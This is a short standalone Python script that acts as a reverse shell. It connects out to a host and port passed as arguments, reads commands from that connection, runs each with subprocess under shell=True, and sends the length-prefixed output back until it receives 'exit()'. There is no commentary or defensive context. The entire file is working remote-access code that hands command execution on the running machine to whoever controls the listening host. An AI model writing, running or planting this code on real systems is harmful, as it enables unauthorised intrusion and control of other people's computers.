#!/usr/bin/env python
import socket,subprocess as sp,sys

host = str(sys.argv[1])
port = int(sys.argv[2])

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))

while 1:
    command = conn.recv(1024).decode('utf-8')

    if command != "exit()":
        sh = sp.Popen(command,shell=True,
                stdout=sp.PIPE,
                stderr=sp.PIPE,
                stdin=sp.PIPE)

        out , err = sh.communicate()

        result = (out + err).decode('utf-8')

        length = str(len(result)).zfill(16)

        conn.send((length + result).encode('utf-8'))
    else:break
conn.close()
        